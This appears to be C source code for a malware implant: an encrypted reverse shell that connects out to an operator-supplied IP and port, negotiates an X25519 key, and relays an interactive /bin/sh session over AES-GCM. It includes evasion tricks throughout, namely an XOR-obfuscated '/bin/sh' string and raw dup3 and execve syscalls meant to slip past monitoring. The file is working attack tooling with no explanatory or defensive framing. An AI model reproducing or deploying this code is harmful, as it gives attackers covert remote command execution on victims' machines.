#include "shell.h"
#include "crypto.h"
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <openssl/rand.h>
#include <string.h>
#include <sys/select.h>
#include <sys/types.h>
#include <sys/syscall.h>

#define SHELL_BUF_SIZE 4096

#ifdef __x86_64__
#define SYSCALL_DUP3 292
#define SYSCALL_EXECVE 59
#endif

// Encrypted version of: "/bin/sh"
static const uint8_t enc_bin_sh[] = { 0x55, 0x18, 0x13, 0x14, 0x55, 0x09, 0x12 };

static char decrypted_buf[64];

char* decrypt_string(const uint8_t *encrypted, size_t len) {
    for (size_t i = 0; i < len; i++) {
        decrypted_buf[i] = encrypted[i] ^ STRING_XOR_KEY;
    }
    decrypted_buf[len] = '\0';
    return decrypted_buf;
}

static inline long raw_dup3(int oldfd, int newfd, int flags) {
    return syscall(SYSCALL_DUP3, oldfd, newfd, flags);
}

static inline long raw_execve(const char *filename, char *const argv[], char *const envp[]) {
    return syscall(SYSCALL_EXECVE, filename, argv, envp);
}

static uint64_t nonce_counter = 0;
static int shell_socket = -1;
static uint8_t session_key[AES_KEY_LEN];

// Create a pipe for encrypted I/O
typedef struct {
    int read_fd;
    int write_fd;
} EncryptedPipe;

static EncryptedPipe stdin_pipe, stdout_pipe;

static int send_encrypted(const uint8_t *data, size_t data_len) {
    if (data_len > SHELL_BUF_SIZE - TAG_LEN) return -1;

    uint8_t ciphertext[SHELL_BUF_SIZE];
    uint8_t tag[TAG_LEN];
    uint8_t nonce[NONCE_LEN];

    memcpy(nonce, &nonce_counter, sizeof(uint64_t));
    RAND_bytes(nonce + sizeof(uint64_t), NONCE_LEN - sizeof(uint64_t));
    nonce_counter++;

    int ct_len = encrypt_aes_gcm(ciphertext, tag, data, data_len, session_key, nonce);
    if (ct_len < 0) return -1;

    uint8_t packet[SHELL_BUF_SIZE + NONCE_LEN + TAG_LEN];
    memcpy(packet, nonce, NONCE_LEN);
    memcpy(packet + NONCE_LEN, ciphertext, ct_len);
    memcpy(packet + NONCE_LEN + ct_len, tag, TAG_LEN);

    uint32_t packet_len = NONCE_LEN + ct_len + TAG_LEN;
    uint32_t len_net = htonl(packet_len);

    if (send(shell_socket, &len_net, sizeof(len_net), 0) < 0) return -1;
    if (send(shell_socket, packet, packet_len, 0) < 0) return -1;

    return 0;
}

static ssize_t recv_encrypted(uint8_t *data, size_t max_len) {
    uint8_t packet[SHELL_BUF_SIZE + NONCE_LEN + TAG_LEN];
    uint32_t packet_len_net;

    if (recv(shell_socket, &packet_len_net, sizeof(packet_len_net), MSG_WAITALL) < 0) return -1;
    uint32_t packet_len = ntohl(packet_len_net);

    if (packet_len > sizeof(packet)) return -1;

    ssize_t received = recv(shell_socket, packet, packet_len, MSG_WAITALL);
    if (received < 0) return -1;

    if (packet_len < NONCE_LEN + TAG_LEN) return -1;

    uint8_t *nonce = packet;
    uint8_t *ciphertext = packet + NONCE_LEN;
    uint8_t *tag = packet + packet_len - TAG_LEN;
    size_t ct_len = packet_len - NONCE_LEN - TAG_LEN;

    if (ct_len > max_len) return -1;

    if (decrypt_aes_gcm(data, ciphertext, ct_len, tag, session_key, nonce) <= 0) return -1;

    return ct_len;
}

static void encrypted_io_handler(void) {
    uint8_t buf[SHELL_BUF_SIZE];
    fd_set readfds;
    int max_fd = (shell_socket > stdout_pipe.read_fd) ? shell_socket : stdout_pipe.read_fd;

    while (1) {
        FD_ZERO(&readfds);
        FD_SET(shell_socket, &readfds);
        FD_SET(stdout_pipe.read_fd, &readfds);

        if (select(max_fd + 1, &readfds, NULL, NULL, NULL) < 0) break;

        // Data from operator (encrypted) -> write to shell stdin
        if (FD_ISSET(shell_socket, &readfds)) {
            ssize_t n = recv_encrypted(buf, sizeof(buf));
            if (n <= 0) break;
            if (write(stdin_pipe.write_fd, buf, n) < 0) break;
        }

        // Data from shell stdout -> encrypt and send to operator
        if (FD_ISSET(stdout_pipe.read_fd, &readfds)) {
            ssize_t n = read(stdout_pipe.read_fd, buf, sizeof(buf));
            if (n <= 0) break;
            if (send_encrypted(buf, n) < 0) break;
        }
    }
}

static int perform_key_exchange(void) {
    X25519_Keypair client_keypair;
    uint8_t server_public_key[X25519_KEYLEN];
    uint8_t shared_secret[X25519_SHARED_SECRET_LEN];

    if (x25519_generate_keypair(&client_keypair) < 0) return -1;

    if (send(shell_socket, client_keypair.public_key, X25519_KEYLEN, 0) < 0) return -1;

    if (recv(shell_socket, server_public_key, X25519_KEYLEN, MSG_WAITALL) < 0) return -1;

    if (x25519_compute_shared_secret(shared_secret, client_keypair.private_key, server_public_key) < 0) {
        return -1;
    }

    if (hkdf_derive_key(session_key, shared_secret, X25519_SHARED_SECRET_LEN) < 0) return -1;

    return 0;
}

void reverse_shell(const char *ip, uint16_t port) {
    shell_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (shell_socket < 0) return;

    struct sockaddr_in target;
    target.sin_family      = AF_INET;
    target.sin_port        = htons(port);
    target.sin_addr.s_addr = inet_addr(ip);

    if (connect(shell_socket, (struct sockaddr*)&target, sizeof(target)) < 0) {
        close(shell_socket);
        return;
    }

    if (perform_key_exchange() < 0) {
        close(shell_socket);
        return;
    }

    // Create pipes for shell I/O
    int stdin_fds[2], stdout_fds[2];
    if (pipe(stdin_fds) < 0 || pipe(stdout_fds) < 0) {
        close(shell_socket);
        return;
    }

    stdin_pipe.read_fd = stdin_fds[0];
    stdin_pipe.write_fd = stdin_fds[1];
    stdout_pipe.read_fd = stdout_fds[0];
    stdout_pipe.write_fd = stdout_fds[1];

    // Fork: child runs shell, parent handles encrypted I/O
    pid_t pid = fork();
    if (pid < 0) {
        close(shell_socket);
        close(stdin_fds[0]);
        close(stdin_fds[1]);
        close(stdout_fds[0]);
        close(stdout_fds[1]);
        return;
    }

    if (pid == 0) {
        // child: run shell with redirected I/O (using raw syscalls)
        close(shell_socket);
        close(stdin_fds[1]);
        close(stdout_fds[0]);

        raw_dup3(stdin_fds[0], STDIN_FILENO, 0);
        raw_dup3(stdout_fds[1], STDOUT_FILENO, 0);
        raw_dup3(stdout_fds[1], 2, 0);  // stderr

        close(stdin_fds[0]);
        close(stdout_fds[1]);

        // Encrypted version of: "/bin/sh"
        char *shell_path = decrypt_string(enc_bin_sh, sizeof(enc_bin_sh));
        char *argv[] = { shell_path, NULL };
        raw_execve(shell_path, argv, NULL);
        exit(1);
    } else {
        // parent: handle encrypted bidirectional I/O
        close(stdin_fds[0]);
        close(stdout_fds[1]);

        encrypted_io_handler();

        close(shell_socket);
        close(stdin_fds[1]);
        close(stdout_fds[0]);
        exit(0);
    }
}